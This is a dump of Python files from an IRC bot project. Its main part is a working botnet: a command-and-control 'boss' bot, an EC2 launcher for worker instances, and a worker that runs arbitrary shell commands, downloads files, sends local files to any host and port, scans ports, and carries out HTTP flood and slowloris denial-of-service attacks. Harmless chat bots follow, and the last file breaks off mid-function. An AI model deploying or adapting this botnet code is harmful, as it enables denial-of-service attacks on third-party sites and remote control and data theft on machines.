__FILENAME__ = boss
#!/usr/bin/env python

import gevent
import logging
import os
import random
import re
import sys
import time

from gevent import socket
from gevent.event import Event
from gevent.queue import Queue
from logging.handlers import RotatingFileHandler
from optparse import OptionParser

from irc import IRCConnection, IRCBot


class BotnetWorker(object):
    """\
    Simple class to track available workers
    """
    def __init__(self, nick, name):
        self.nick = nick
        self.name = name
        self.awaiting_ping = Event()


class Task(object):
    """\
    A single command sent to any number of workers.  Serves as the storage for
    any results returned by the workers.
    """
    _id = 0
    
    def __init__(self, command):
        """\
        Initialize the Task with a command, where the command is a string
        representing the action to be taken, i.e. `dos charlesleifer.com`
        """
        self.command = command
        
        Task._id += 1
        self.id = Task._id
        self.data = {}
        
        self.workers = set()
        self.finished = set()
    
    def add(self, nick):
        """\
        Indicate that the worker with given nick is performing this task
        """
        self.data[nick] = ''
        self.workers.add(nick)
    
    def done(self, nick):
        """\
        Indicate that the worker with the given nick has finished this task
        """
        self.finished.add(nick)
    
    def is_finished(self):
        return self.finished == self.workers


class BotnetBot(IRCBot):
    """\
    Command and control bot for a simple Botnet
    """
    
    def __init__(self, conn, secret, channel):
        # initialize connection and register callbacks via parent class
        super(BotnetBot, self).__init__(conn)
        
        # store secret used for authentication and nick of administrator
        self.secret = secret
        self.boss = None
        
        # store channels -- possibly use random channel for the command channel?
        self.channel = channel
        self.cmd_channel = channel + '-cmd'
        
        # store worker bots in a dictionary keyed by nickname
        self.workers = {}
        
        # used for uptime
        self.start = time.time()
        
        # start a greenlet that periodically checks worker health
        self.start_worker_health_greenlet()
        
        # store tasks in a dictionary keyed by task id
        self.tasks = {}
        
        # get a logger instance piggy-backing off the underlying connection's
        # get_logger() method - this logger will be used to store data from
        # the workers
        self.logger = self.get_data_logger()
        
        # grab a reference to the connection logger for logging server state
        self.conn_logger = self.conn.logger
        
        # join the two channels
        self.conn.join(self.channel)
        self.conn.join(self.cmd_channel)
    
    def get_data_logger(self):
        return self.conn.get_logger('botnet.botnetbot.data.logger', 'botnet.data.log')
    
    def send_workers(self, msg):
        """\
        Convenience method to send data to the workers via command channel
        """
        self.respond(msg, self.cmd_channel)
    
    def send_user(self, msg):
        """\
        Convenience method to send data to the administrator via the normal channel
        """
        self.respond(msg, self.channel)
    
    def start_worker_health_greenlet(self):
        """\
        Start a greenlet that monitors workers' health
        """
        gevent.spawn(self._worker_health_greenlet)
    
    def _worker_health_greenlet(self):
        while 1:
            # broadcast a message to all workers
            self.send_workers('!worker-ping')
            
            # indicate that all workers are awaiting ping
            for worker_nick in self.workers:
                self.workers[worker_nick].awaiting_ping.set()
            
            # wait two minutes
            gevent.sleep(120)
            
            dead = []
            
            # find all workers who didn't respond to the ping
            for worker_nick, worker in self.workers.items():
                if worker.awaiting_ping.is_set():
                    self.conn_logger.warn('worker [%s] is dead' % worker_nick)
                    dead.append(worker_nick)
            
            if dead:
                self.send_user('Removed %d dead workers' % len(dead))
                
                for nick in dead:
                    self.unregister(nick)
    
    def require_boss(self, callback):
        """\
        Callback decorator that enforces the calling user be botnet administrator
        """
        def inner(nick, message, channel, *args, **kwargs):
            if nick != self.boss:
                return
            
            return callback(nick, message, channel, *args, **kwargs)
        return inner
    
    def command_patterns(self):
        return (
            ('\/join', self.join_handler),
            ('\/quit', self.quit_handler),
            ('!auth (?P<password>.+)', self.auth),
            ('!execute (?:(?P<num_workers>\d+)? )?(?P<command>.+)', self.require_boss(self.execute_task)),
            ('!print(?: (?P<task_id>\d+))?', self.require_boss(self.print_task)),
            ('!register (?P<hostname>.+)', self.register),
            ('!stop', self.require_boss(self.stop)),
            ('!status', self.require_boss(self.status)),
            ('!task-data (?P<task_id>\d+):(?P<data>.+)', self.task_data),
            ('!task-finished (?P<task_id>\d+)', self.task_finished),
            ('!task-received (?P<task_id>\d+)', self.task_received),
            ('!uptime', self.require_boss(self.uptime)),
            ('!worker-pong (?P<hostname>.+)', self.worker_health_handler),
            ('!help', self.require_boss(self.help)),
        )
    
    def join_handler(self, nick, message, channel):
        self.logger.debug('%s joined #%s' % (nick, channel))
    
    def quit_handler(self, nick, message, channel):
        if channel == self.cmd_channel and nick in self.workers:
            self.logger.info('Worker %s left, unregistering' % (nick))
            self.unregister(nick)
    
    def auth(self, nick, message, channel, password):
        if not self.boss and password == self.secret:
            self.boss = nick
            self.logger.info('%s authenticated successfully' % nick)
            return 'Success'
        else:
            self.logger.error('%s failed to authenticate' % nick)
    
    def execute_task(self, nick, message, channel, command, num_workers=None):
        task = Task(command)
        self.tasks[task.id] = task
        
        if num_workers is None or int(num_workers) >= len(self.workers):
            # short-hand way of sending to all workers
            num_workers = len(self.workers)
            self.send_workers('!worker-execute %s:%s' % (task.id, task.command))
        else:
            num_workers = int(num_workers)
            
            available_workers = set(self.workers.keys())
            sent = 0
            
            msg_template = '!worker-execute (%%s) %s:%s' % (task.id, task.command)
            
            max_msg_len = 400
            msg_len = len(msg_template % '')
            msg_diff = max_msg_len - msg_len
            
            available = msg_diff
            send_to = []
            
            # batch up command to workers
            while sent < num_workers:
                worker_nick = available_workers.pop()
                send_to.append(worker_nick)
                sent += 1
                available -= (len(worker_nick) + 1)
                
                if available <= 0 or sent == num_workers:
                    self.send_workers(msg_template % (','.join(send_to)))
                    available = msg_diff
                    send_to = []
        
        self.send_user('Scheduled task: "%s" with id %s [%d workers]' % (
            task.command, task.id, num_workers
        ))
    
    def execute_task_once(self, nick, message, channel, command):
        task = Task(command)
        self.tasks[task.id] = task
        
        worker = self.workers[random.choice(self.workers.keys())]
        self.send_user('Scheduled task: "%s" with id %s - worker: [%s:%s]' % (
            task.command, task.id, worker.nick, worker.name
        ))
        self.respond('!worker-execute %s:%s' % (task.id, task.command), nick=worker.nick)
    
    def print_task(self, nick, message, channel, task_id=None):
        if not self.tasks:
            return 'No tasks to print'
        
        task_id = int(task_id or max(self.tasks.keys()))
        task = self.tasks[task_id]
        
        def printer(task):
            for nick, data in task.data.iteritems():
                worker = self.workers[nick]
                self.send_user('[%s:%s] - %s' % (worker.nick, worker.name, task.command))
                for line in data.splitlines():
                    self.send_user(line.strip())
                    gevent.sleep(.2)
        
        gevent.spawn(printer, task)
    
    def uptime(self, nick, message, channel):
        curr = time.time()
        seconds_diff = curr - self.start
        hours, remainder = divmod(seconds_diff, 3600)
        minutes, seconds = divmod(remainder, 60)
        return 'Uptime: %d:%02d:%02d' % (hours, minutes, seconds)
    
    def register(self, nick, message, channel, hostname):
        if nick not in self.workers:
            self.workers[nick] = BotnetWorker(nick, hostname)
            self.logger.info('added worker [%s]' % nick)
        else:
            self.logger.warn('already registered [%s]' % nick)
        
        return '!register-success %s' % self.cmd_channel
    
    def unregister(self, worker_nick):
        del(self.workers[worker_nick])
    
    def status(self, nick, message, channel):
        self.send_user('%s workers available' % len(self.workers))
        self.send_user('%s tasks have been scheduled' % len(self.tasks))
    
    def stop(self, nick, message, channel):
        self.send_workers('!worker-stop')
    
    def task_data(self, nick, message, channel, task_id, data):
        # add the data to the task's data
        self.tasks[int(task_id)].data[nick] += '%s\n' % data
    
    def task_finished(self, nick, message, channel, task_id):
        task = self.tasks[int(task_id)]
        task.done(nick)
        
        self.conn_logger.info('task [%s] finished by worker %s' % (task.id, nick))
        self.logger.info('%s:%s:%s' % (task.id, nick, task.data))
        
        if task.is_finished():
            self.send_user('Task %s completed by %s workers' % (task.id, len(task.data)))
    
    def task_received(self, nick, message, channel, task_id):
        task = self.tasks[int(task_id)]
        task.add(nick)
        self.conn_logger.info('task [%s] received by worker %s' % (task.id, nick))
    
    def worker_health_handler(self, nick, message, channel, hostname):
        if nick in self.workers:
            self.workers[nick].awaiting_ping.clear()
            self.logger.debug('Worker [%s] is alive' % nick)
        else:
            self.register(nick, message, channel, hostname)

    def help(self, nick, message, channel, hostname):
        self.send_user('!execute (num workers) <command> -- run "command" on workers')
        self.send_user('!print (task id) -- print output of tasks or task with id')
        self.send_user('!stop -- tell workers to stop their current task')
        self.send_user('!status -- get status on workers and tasks')
        self.send_user('!uptime -- boss uptime')


def get_parser():
    parser = OptionParser(usage='%prog [options]')
    parser.add_option('--server', '-s', dest='server', default='irc.freenode.net',
        help='IRC server to connect to')
    parser.add_option('--port', '-p', dest='port', default=6667,
        help='Port to connect on', type='int')
    parser.add_option('--nick', '-n', dest='nick', default='boss1337',
        help='Nick to use')
    parser.add_option('--secret', '-x', dest='secret', default='password')
    parser.add_option('--channel', '-c', dest='channel', default='#botwars-test')
    parser.add_option('--logfile', '-f', dest='logfile')
    parser.add_option('--verbosity', '-v', dest='verbosity', default=1, type='int')
    
    return parser

if __name__ == '__main__':    
    parser = get_parser()
    (options, args) = parser.parse_args()
    
    conn = IRCConnection(options.server, options.port, options.nick,
        options.logfile, options.verbosity)
    conn.connect()
    
    bot = BotnetBot(conn, options.secret, options.channel)
    
    conn.enter_event_loop()

########NEW FILE########
__FILENAME__ = launcher
#!/usr/bin/env python

import logging
import optparse
import time
import sys

import boto

logger = logging.getLogger('botnet.bootstrap')


class BotNetLauncher(object):
    def __init__(self, worker_options, aws_key=None, aws_secret=None, image_id='ami-ab36fbc2',
                 instance_type='t1.micro', key_name=None, security_group=None, workers=None, quiet=False,
                 bootstrap_script='bootstrap.sh'):
        
        self.worker_options = worker_options
        self.aws_key = aws_key
        self.aws_secret = aws_secret
        self.image_id = image_id
        self.instance_type = instance_type
        self.key_name = key_name
        self.security_group = security_group
        self.workers = workers
        self.quiet = quiet
        self.bootstrap_script = bootstrap_script

        if self.security_group:
            self.security_group = [self.security_group]
    
    def get_conn(self):
        return boto.connect_ec2(self.aws_key, self.aws_secret)
    
    def get_instances(self):
        ec2 = self.get_conn()
        filters = {'tag:irc': '1'}
        return ec2.get_all_instances(filters=filters)
    
    def get_user_data(self):
        fh = open(self.bootstrap_script)
        contents = fh.read()
        fh.close()
        return contents % {
            'worker_options': self.worker_options,
        }
    
    def wait_instances(self, instances):
        i_states = dict((i, False) for i in instances)
        
        running = lambda i: i.state == 'running'
        
        while not all(i_states.values()):
            for instance, is_running in i_states.items():
                if is_running:
                    continue
                
                instance.update()
                if not self.quiet:
                    sys.stdout.write('.')
                    sys.stdout.flush()
                
                if instance.state == 'running':
                    i_states[instance] = True
            
            time.sleep(3)
    
    def launch(self):
        if not self.quiet:
            print 'About to create %d instances' % self.workers
            if raw_input('Continue Yn ?') == 'n':
                sys.exit(0)

        ec2 = self.get_conn()
        
        logger.info('Reading script %s' % self.bootstrap_script)
        user_data = self.get_user_data()

        logger.info('AMI [%s] - starting %d instances' % (self.image_id, self.workers))
        reservation = ec2.run_instances(
            self.image_id,
            min_count=self.workers,
            key_name=self.key_name,
            security_groups=self.security_group,
            instance_type=self.instance_type,
            user_data=user_data
        )

        instances = reservation.instances
        
        logger.info('Waiting for instances')
        self.wait_instances(instances)

        for instance in instances:
            instance.add_tag('irc', '1')
        
        if not self.quiet:
            print '\nSummary\n'
            for instance in instances:
                print '\nInstance ID: %s\n  AMI=%s\n  DNS=%s' % (instance.id, instance.image_id, instance.dns_name)

        return instances
    
    def terminate(self):
        reservations = self.get_instances()
        instance_ids = [i.id for r in reservations for i in r.instances]
        print 'About to terminate the following %d instances:\n%s' % (len(instance_ids), ', '.join(instance_ids))
        if raw_input('Really stop? yN ') == 'y':
            ec2 = self.get_conn()
            print ec2.terminate_instances(instance_ids)
    
    def show(self):
        reservations = self.get_instances()
        
        if reservations:
            for res in reservations:
                print 'Reservation %s' % res.id
                for instance in res.instances:
                    print '\nInstance ID: %s\n  AMI=%s\n  DNS=%s' % (instance.id, instance.image_id, instance.dns_name)
                print '\n'
        else:
            print 'No reservations found'

    def help(self):
        parser = get_parser()
        parser.print_help()

        print '\nAvailable commands:'
        for cmd in self.get_command_mapping():
            print '  - %s' % cmd
    
    def get_command_mapping(self):
        return {
            'launch': self.launch,
            'terminate': self.terminate,
            'show': self.show,
            'help': self.help,
        }
    
    def handle(self, cmd):
        commands = self.get_command_mapping()
        return commands[cmd]()


def get_parser():
    parser = optparse.OptionParser(usage='%prog [cmd] [options]')
    parser.add_option('--workers', dest='workers', type='int', default=1,
        help='Number of instances/workers to start')
    parser.add_option('--quiet', '-q', dest='quiet', action='store_true')
    parser.add_option('--script', dest='bootstrap_script', default='bootstrap.sh')
    
    boto_ops = parser.add_option_group('EC2 options')
    boto_ops.add_option('--ami', dest='image_id', default='ami-ab36fbc2')
    boto_ops.add_option('--key', dest='aws_key')
    boto_ops.add_option('--secret', dest='aws_secret')
    boto_ops.add_option('--type', dest='instance_type', default='t1.micro')
    boto_ops.add_option('--key-name', dest='key_name', help='Security key name (e.g. master-key)')
    boto_ops.add_option('--group', dest='security_group', help='Security group (e.g. default)')
    
    # --- for workers ---
    worker_ops = parser.add_option_group('Worker options')
    worker_ops.add_option('--server', '-s', dest='server',
        help='IRC server to connect to')
    worker_ops.add_option('--port', '-p', dest='port',
        help='Port to connect on', type='int')
    worker_ops.add_option('--nick', '-n', dest='nick',
        help='Nick to use')
    worker_ops.add_option('--boss', '-b', dest='boss')
    worker_ops.add_option('--logfile', '-f', dest='logfile')
    worker_ops.add_option('--verbosity', '-v', dest='verbosity')
    
    return parser

if __name__ == '__main__':    
    parser = get_parser()
    (options, args) = parser.parse_args()
    
    worker_options = {
        'server': 's', 
        'port': 'p',
        'nick': 'n',
        'boss': 'b',
        'logfile': 'f',
        'verbosity': 'v',
    }
    ops_list = []
    for k, v in worker_options.items():
        worker_op = getattr(options, k)
        if worker_op:
            ops_list.append('-%s %s' % (v, worker_op))
    worker_options = ' '.join(ops_list)
    
    launcher_options = ['aws_key', 'aws_secret', 'instance_type', 'key_name', 'security_group', 'image_id', 'workers', 'quiet']
    launcher_config = dict((k, getattr(options, k)) for k in launcher_options)
    
    launcher = BotNetLauncher(worker_options, **launcher_config)
    
    if not options.quiet:
        logger.addHandler(logging.StreamHandler(sys.stdout))
        logger.setLevel(logging.INFO)
    else:
        logger.setLevel(logging.ERROR)
    
    if args:
        if len(args) != 1:
            print 'Error, incorrect number of arguments specified'
            parser.print_help()
            sys.exit(1)
        cmd = args[0]
        try:
            launcher.handle(cmd)
        except KeyError:
            print 'Unknown command %s' % cmd
            print 'Valid commands: %s' % (', '.join(launcher.get_command_mapping().keys()))
            parser.print_help()
            sys.exit(2)
    else:
        launcher.launch()

########NEW FILE########
__FILENAME__ = worker
#!/usr/bin/env python

import datetime
import gevent
import os
import platform
import random
import re
import sys
import time

from gevent import monkey
monkey.patch_all()

import urllib2

from gevent import socket
from gevent.dns import DNSError
from gevent.event import Event
from gevent.queue import Queue

import logging
from logging.handlers import RotatingFileHandler
from optparse import OptionParser

from irc import IRCConnection, IRCBot


class BaseWorkerBot(IRCBot):
    """\
    A base class suitable for implementing a Worker that can communicate with
    the BotnetBot and execute commands
    """
    def __init__(self, conn, boss):
        super(BaseWorkerBot, self).__init__(conn)
        
        # event to track when this worker gets registered
        self.registered = Event()
        
        # store the nickname of the command bot
        self.boss = boss
        
        # load up any task patterns
        self.task_patterns = self.get_task_patterns()
        
        # keep a queue of tasks
        self.task_queue = Queue()
        
        # flag to allow stopping currently running task at any time
        self.stop_flag = Event()
        
        # start 2 greenlets, one to ensure the worker gets registered and
        # the other to pull tasks from the queue and execute them
        gevent.spawn(self.register_with_boss)
        gevent.spawn(self.task_runner)
    
    def get_task_patterns(self):
        """\
        Like everything else, a bunch of two-tuples containing a regex to match
        and a callback that takes arguments from the regex
        """
        raise NotImplementedError
    
    def register_with_boss(self):
        """\
        Register the worker with the boss
        """
        gevent.sleep(10) # wait for things to connect, etc
        
        while not self.registered.is_set():
            self.respond('!register {%s}' % platform.node(), nick=self.boss)
            gevent.sleep(30)
    
    def task_runner(self):
        """\
        Run tasks in a greenlet, pulling from the workers' task queue and
        reporting results to the command channel
        """
        while 1:
            (task_id, command) = self.task_queue.get()
            
            for pattern, callback in self.task_patterns:
                match = re.match(pattern, command)
                if match:
                    # execute the callback
                    ret = callback(**match.groupdict()) or ''
                    
                    # clear the stop flag in the event it was set
                    self.stop_flag.clear()
                    
                    # send output of command to channel
                    for line in ret.splitlines():
                        self.respond('!task-data %s:%s' % (task_id, line), self.channel)
                        gevent.sleep(.34)
            
            # indicate task is complete
            self.respond('!task-finished %s' % task_id, self.channel)
    
    def require_boss(self, callback):
        """\
        Decorator to ensure that commands only can come from the boss
        """
        def inner(nick, message, channel, *args, **kwargs):
            if nick != self.boss:
                return
            
            return callback(nick, message, channel, *args, **kwargs)
        return inner
    
    def command_patterns(self):
        """\
        Actual messages listened for by the worker bot - note that worker-execute
        actually dispatches again by adding the command to the task queue,
        from which it is pulled then matched against self.task_patterns
        """
        return (
            ('!register-success (?P<cmd_channel>.+)', self.require_boss(self.register_success)),
            ('!worker-execute (?:\((?P<workers>.+?)\) )?(?P<task_id>\d+):(?P<command>.+)', self.require_boss(self.worker_execute)),
            ('!worker-ping', self.require_boss(self.worker_ping_handler)),
            ('!worker-stop', self.require_boss(self.worker_stop)),
        )
    
    def register_success(self, nick, message, channel, cmd_channel):
        """\
        Received registration acknowledgement from the BotnetBot, as well as the
        name of the command channel, so join up and indicate that registration
        succeeded
        """
        # the boss will tell what channel to join
        self.channel = cmd_channel
        self.conn.join(self.channel)
        
        # indicate that registered so we'll stop trying
        self.registered.set()
    
    def worker_execute(self, nick, message, channel, task_id, command, workers=None):
        """\
        Work on a task from the BotnetBot
        """
        if workers:
            nicks = workers.split(',')
            do_task = self.conn.nick in nicks
        else:
            do_task = True
        
        if do_task:
            self.task_queue.put((int(task_id), command))
            return '!task-received %s' % task_id
    
    def worker_stop(self, nick, message, channel):
        """\
        Hook to allow any task to be stopped (provided the task checks the stop flag)
        """
        self.stop_flag.set()
    
    def worker_ping_handler(self, nick, message, channel):
        """\
        Respond to pings sent periodically by the BotnetBot
        """
        return '!worker-pong {%s}' % platform.node()


class Conn(object):
    """\
    A simple connection class used by the slowloris attack
    """
    def __init__(self, host, port, socket_timeout):
        self.host = host
        self.port = port
        self.socket_timeout = socket_timeout
        self.connected = False
    
    def connect(self):
        # recreate the socket object
        self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._sock.settimeout(self.socket_timeout)
        
        # indicate that we are not connected
        self.connected = False
        
        try:
            self._sock.connect((self.host, self.port))
        except DNSError:
            pass
        except socket.error:
            pass
        else:
            self.connected = True
        
        return self.connected
    
    def send(self, data):
        try:
            return self._sock.send(data)
        except socket.error:
            self.connected = False
            raise


class WorkerBot(BaseWorkerBot):
    primary_payload = "GET /%s HTTP/1.1\r\n" +\
        "Host: %s\r\n" +\
        "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\n" +\
        "Content-Length: 42\r\n"
    
    def get_task_patterns(self):
        return (
            ('download (?P<url>.*)', self.download),
            ('get_time(?: (?P<format>.+))?', self.get_time),
            ('info', self.info),
            ('ports', self.ports),
            ('run (?P<program>.*)', self.run),
            ('send_file (?P<filename>[^\s]+) (?P<destination>[^\s]+)', self.send_file),
            ('siege (?P<url>.*)', self.siege),
            ('slowloris (?P<host>[^\s]+) (?P<num>\d+) (?P<timeout>\d+)(?: (?P<port>\d+))?', self.slowloris),
            ('slowloristest (?P<host>[^\s]+)(?: (?P<port>\d+))?', self.slowloristest),
            ('status', self.status_report),
        )
    
    def get_time(self, format=None):
        now = datetime.datetime.now() # remember to import datetime at the top of the module
        if format:
            return now.strftime(format)
        return str(now)
    
    def download(self, url):
        path, filename = url.rsplit('/', 1)
        
        try:
            request = urllib2.urlopen(url)
        except:
            return "failure: unable to fetch %s" % url
        
        try:
            fh = open(filename, 'w')
        except IOError:
            return "failure: unable to open %s" % filename
            
        while not self.stop_flag.is_set():
            data = request.read(4096)
            
            if not data:
                break
            
            fh.write(data)
        
        return "downloaded %s" % filename
    
    def info(self):
        return '%s: %s, %s, %s, %s' % (
            __file__,
            platform.platform(),
            platform.architecture()[0],
            platform.node(),
            platform.python_version(),
        )
    
    def ports(self):
        open_ports = []
        for port in range(20, 1025):  
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
            result = sock.connect_ex(('127.0.0.1', port)) 
            
            if result == 0:  
                open_ports.append(port)
            sock.close()
        
        return str(open_ports)
    
    def run(self, program):
        fh = os.popen(program)
        return fh.read()
    
    def send_file(self, filename, destination):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            host, port = destination.split(':')
            sock.connect((host, int(port)))
        except:
            return 'failed to connect to %s' % host
        
        try:
            fh = open(filename, 'r')
        except IOError:
            return 'failed to open %s' % filename
        
        while 1:
            data = fh.read(4096)
            
            if not data:
                break
            
            sock.send(data)
        
        fh.close()
        sock.close()
        return 'sent successfully'
    
    def siege(self, url):
        count = 0
        
        def fetcher(url):
            req = urllib2.urlopen(url)
            req.read()
        
        while not self.stop_flag.is_set():
            greenlets = [
                gevent.spawn(fetcher, url) for x in range(100)
            ]
            [g.join() for g in greenlets]
            count += 100
        
        return 'sent %s requests' % count
    
    def slowloris(self, host, num, timeout, port=None):
        port = port or 80
        timeout = int(timeout)
        conns = [Conn(host, int(port), 5) for i in range(int(num))]
        failed = 0
        packets = 0
        
        while not self.stop_flag.is_set():
            for conn in conns:
                if self.stop_flag.is_set():
                    break
                
                if not conn.connected:
                    if conn.connect():
                        packets += 3
                
                if conn.connected:
                    query = '?%d' % random.randint(1, 9999999999999)
                    payload = self.primary_payload % (query, conn.host)
                    try:
                        conn.send(payload)
                        packets += 1
                    except socket.error:
                        pass
                else:
                    pass
            
            for conn in conns:
                if self.stop_flag.is_set():
                    break
                
                if conn.connected:
                    try:
                        conn.send('X-a: b\r\n')
                        packets += 1
                    except socket.error:
                        pass

            gevent.sleep(timeout)
            
        return "%s failed, %s packets sent" % (failed, packets)
    
    def slowloristest(self, host, port=None):
        port = port or 80
        times = [2, 30, 90, 240]
        delay = 0
        best = None
        
        try:
            conn = Conn(host, int(port), 5)
            conn.connect()
        except:
            return 'error connecting'
        
        query = '?%d' % random.randint(1, 9999999999999)
        payload = self.primary_payload % (query, conn.host)
        
        try:
            conn.send(payload)
        except socket.error:
            return 'error sending data'
        
        for interval in times:
            gevent.sleep(interval)
            
            try:
                conn.send('X-a: b\r\n')
            except:
                pass
            else:
                best = interval

        try:
            conn.send('Connection: Close\r\n\r\n')
        except:
            pass
        
        return 'use %d for timeout' % best
    
    def status_report(self):
        return self.task_queue.qsize()


def get_parser():
    parser = OptionParser(usage='%prog [options]')
    parser.add_option('--server', '-s', dest='server', default='irc.freenode.net',
        help='IRC server to connect to')
    parser.add_option('--port', '-p', dest='port', default=6667,
        help='Port to connect on', type='int')
    parser.add_option('--nick', '-n', dest='nick', default='worker',
        help='Nick to use')
    parser.add_option('--boss', '-b', dest='boss', default='boss1337')
    parser.add_option('--logfile', '-f', dest='logfile')
    parser.add_option('--verbosity', '-v', dest='verbosity', default=1, type='int')
    
    return parser


if __name__ == '__main__':    
    parser = get_parser()
    (options, args) = parser.parse_args()
    
    conn = IRCConnection(options.server, options.port, options.nick,
        options.logfile, options.verbosity)
    conn.connect()
    
    bot = WorkerBot(conn, options.boss)
    conn.enter_event_loop()

########NEW FILE########
__FILENAME__ = ascii
import httplib2
import random
import time
import urllib

from irc import IRCBot, run_bot


class AsciiArtBot(IRCBot):
    groupings = ['ab', 'c', 'def', 'ghi', 'jkl', 'mno', 'pqr', 's', 't', 'uvw', 'xyz']
    
    def get_grouping(self, word):
        first_char = word.lower()[0]
        for grouping in self.groupings:
            if first_char in grouping:
                return grouping
    
    def fetch_result(self, query):
        sock = httplib2.Http(timeout=1)
        
        query = query.strip()
        potentials = [query]
        if query.endswith('s'):
            potentials.append(query[:-1])
        
        grouping = self.get_grouping(query)
        
        for potential in potentials:
            headers, response = sock.request(
                'http://www.ascii-art.de/ascii/%s/%s.txt' % (
                grouping, urllib.quote(potential)
            ))
            if headers['status'] in (200, '200'):
                return self.random_from(response)
    
    def random_from(self, ascii_art):
        guesses = ascii_art.split('\n\n\n')
        while len(guesses):
            img = random.randint(0, len(guesses) - 1)
            if self.is_quality(guesses[img]):
                return guesses[img]
            else:
                guesses = guesses[:img] + guesses[img + 1:]
    
    def is_quality(self, img):
        non_empty_lines = 0
        for line in img.splitlines():
            if line.strip():
                non_empty_lines += 1
        
        return non_empty_lines > 3
    
    def display(self, nick, message, channel):
        result = self.fetch_result(message)
        if result:
            for line in result.splitlines()[:45]:
                self.respond(line, channel=channel)
                time.sleep(.2)
    
    def command_patterns(self):
        return (
            self.ping('^\S+', self.display),
        )


host = 'irc.freenode.net'
port = 6667
nick = 'picasso_bot'

run_bot(AsciiArtBot, host, port, nick, ['#botwars'])

########NEW FILE########
__FILENAME__ = googlebot
import httplib2
import json
import urllib

from irc import IRCBot, run_bot


class GoogleBot(IRCBot):
    def fetch_result(self, query):
        sock = httplib2.Http(timeout=1)
        headers, response = sock.request(
            'http://ajax.googleapis.com/ajax/services/search/web?v=2.0&q=%s' % \
            urllib.quote(query)
        )
        if headers['status'] in (200, '200'):
            response = json.loads(response)
            return response['responseData']['results'][0]['unescapedUrl']
    
    def find_me(self, nick, message, channel, query):
        result = self.fetch_result(query)
        if result:
            return result
    
    def command_patterns(self):
        return (
            self.ping('^find me (?P<query>\S+)', self.find_me),
        )


host = 'irc.freenode.net'
port = 6667
nick = 'googlebot1337'

run_bot(GoogleBot, host, port, nick, ['#botwars'])

########NEW FILE########
__FILENAME__ = lolbot
#!/usr/bin/python
import random
import re
import redis

from irc import IRCBot, run_bot


class LolBot(IRCBot):
    key = 'lolbot'
    url_pattern = re.compile('(https?://[-A-Za-z0-9+&@#/%?=~_()|!:,.;]*[-A-Za-z0-9+&@#/%=~_|])')
    phrases = 'lol|haha|:\)|nice|wat\?|wtf'
    influencer_patterns = [
        ('^%(sender)s[:,\s]\s(%(phrases)s)', 3),
        ('^(%(phrases)s)', 1),
    ]

    lifetime = 5
    repeat_score = 5
    
    def __init__(self, *args, **kwargs):
        super(LolBot, self).__init__(*args, **kwargs)
        
        self.message_count = 0
        self.last_urls = {}
        self.redis_conn = redis.Redis()

    def store_url(self, sender, url):
        score = self.redis_conn.zscore(self.key, url)
        if score is None:
            self.redis_conn.zadd(self.key, url, 1)
        else:
            self.redis_conn.zincrby(self.key, url, self.repeat_score)

    def search_urls(self, sender, message, channel):
        if not self.url_pattern.search(message):
            return

        self.message_count = self.lifetime

        for url in self.url_pattern.findall(message):
            self.store_url(sender, url)
            self.last_urls[channel] = {
                'sender': sender,
                'url': url,
            }

    def check_lulz(self, sender, message, channel):
        if channel in self.last_urls and self.message_count > 0:
            vals = {
                'sender': self.last_urls[channel]['sender'],
                'phrases': self.phrases,
            }
            for pattern, score in self.influencer_patterns:
                if re.match(pattern % vals, message):
                    self.redis_conn.zincrby(self.last_urls[channel]['url'], score)

    def log(self, sender, message, channel):
        if self.message_count > 0:
            self.message_count -= 1

        self.check_lulz(sender, message, channel)
        self.search_urls(sender, message, channel)

    def command_patterns(self):
        return (
            ('.*', self.log),
        )


host = 'irc.freenode.net'
port = 6667
nick = 'walrus-whisker'

run_bot(LolBot, host, port, nick, ['#lawrence-botwars'])

########NEW FILE########
__FILENAME__ = markov
#!/usr/bin/python
import os
import pickle
import random
import re
import sys

from irc import IRCBot, IRCConnection


class MarkovBot(IRCBot):
    """
    Hacking on a markov chain bot - based on:
    http://code.activestate.com/recipes/194364-the-markov-chain-algorithm/
    http://github.com/ericflo/yourmomdotcom
    """
    messages_to_generate = 5
    chattiness = .01
    max_words = 15
    chain_length = 2
    stop_word = '\n'
    filename = 'markov.db'
    last = None 
    
    def __init__(self, *args, **kwargs):
        super(MarkovBot, self).__init__(*args, **kwargs)
        self.load_data()
    
    def load_data(self):
        if os.path.exists(self.filename):
            fh = open(self.filename, 'rb')
            self.word_table = pickle.loads(fh.read())
            fh.close()
        else:
            self.word_table = {}
    
    def save_data(self):
        fh = open(self.filename, 'w')
        fh.write(pickle.dumps(self.word_table))
        fh.close()

    def split_message(self, message):
        words = message.split()
        if len(words) > self.chain_length:
            words.extend([self.stop_word] * self.chain_length)
            for i in range(len(words) - self.chain_length):
                yield (words[i:i + self.chain_length + 1])

    def generate_message(self, person, size=15, seed_key=None):
        person_words = len(self.word_table.get(person, {}))
        if person_words < size:
            return

        if not seed_key:
            seed_key = random.choice(self.word_table[person].keys())

        message = []
        for i in xrange(self.messages_to_generate):
            words = seed_key
            gen_words = []
            for i in xrange(size):
                if words[0] == self.stop_word:
                    break

                gen_words.append(words[0])
                try:
                    words = words[1:] + (random.choice(self.word_table[person][words]),)
                except KeyError:
                    break

            if len(gen_words) > len(message):
                message = list(gen_words)
        
        return ' '.join(message)

    def imitate(self, sender, message, channel):
        person = message.replace('imitate ', '').strip()[:10]
        if person != self.conn.nick:
            return self.generate_message(person)

    def cite(self, sender, message, channel):
        if self.last:
            return self.last
    
    def sanitize_message(self, message):
        """Convert to lower-case and strip out all quotation marks"""
        return re.sub('[\"\']', '', message.lower())

    def log(self, sender, message, channel):
        sender = sender[:10]
        self.word_table.setdefault(sender, {})
        
        if message.startswith('/'):
            return

        try:
            say_something = self.is_ping(message) or sender != self.conn.nick and random.random() < self.chattiness
        except AttributeError:
            say_something = False
        messages = []
        seed_key = None
        
        if self.is_ping(message):
            message = self.fix_ping(message)

        for words in self.split_message(self.sanitize_message(message)):
            key = tuple(words[:-1])
            if key in self.word_table:
                self.word_table[sender][key].append(words[-1])
            else:
                self.word_table[sender][key] = [words[-1]]

            if self.stop_word not in key and say_something:
                for person in self.word_table:
                    if person == sender:
                        continue
                    if key in self.word_table[person]:
                        generated = self.generate_message(person, seed_key=key)
                        if generated:
